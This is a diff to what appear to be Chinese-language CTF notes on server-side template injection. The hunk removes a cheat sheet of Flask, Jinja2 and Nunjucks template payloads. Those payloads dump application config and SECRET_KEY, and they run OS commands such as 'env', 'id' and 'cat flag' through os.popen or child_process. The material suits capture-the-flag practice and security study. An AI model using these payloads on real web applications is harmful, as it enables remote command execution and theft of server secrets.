@@ -123,29 +123,7 @@ https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/in
 
 ### 常见flag
 ```
-{{config}}
-{{config.items()}}
-{{settings.SECRET_KEY}}
-{"secret":"{{config}}"}
-{"secret":"{{config.SECRET_KEY}}"}
-{"secret":"{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}"}
-{"secret":"{{self.__dict__}}"}
-{"secret":"{{ config.__class__.__init__.__globals__['os'].popen('ls -F').read() }}"}
-{"secret":"{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}"}
 
-## 执行OS命令（command injection） - Flask SSTI
-{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}
-{{ config.__class__.__init__.__globals__['os'].popen('ls -F').read() }}
-{{ config.__class__.__init__.__globals__['os'].popen('cat flag').read() }}
-
-## 执行OS命令（command injection） - Jinja2 SSTI
-{{cycler.__init__.__globals__.os.popen('id').read()}}
-{{cycler.__init__.__globals__.os.popen('/getpassword').read()}}
-
-
-## Nunjucks payload
-{{constructor.constructor('return process')().mainModule.require('child_process').execSync('id')}}
-{{constructor.constructor('return process')().mainModule.require('child_process').execSync('cat server.js')}}
 ```
 
 
